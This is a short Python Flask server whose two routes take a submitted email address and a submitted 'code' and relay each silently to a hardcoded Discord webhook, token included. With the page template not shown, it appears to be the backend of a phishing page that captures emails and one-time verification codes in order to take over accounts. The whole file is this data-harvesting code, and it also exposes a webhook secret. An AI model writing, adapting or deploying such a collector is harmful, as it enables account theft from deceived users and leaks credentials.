from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBWAHNAv8DLennJgDm2QUYnCeIxxruMIdf9BLqj1CSxRsP09NxOBLr7Sm_u"

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/email", methods=["POST"])
def email():
    data = request.json or {}
    requests.post(WEBHOOK_URL, json={
        "content": f"📧 **Email submitted:** {data.get('email')}"
    })
    return jsonify(ok=True)

@app.route("/code", methods=["POST"])
def code():
    data = request.json or {}
    requests.post(WEBHOOK_URL, json={
        "content": f"🔢 **Code submitted:** {data.get('code')}"
    })
    return jsonify(ok=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
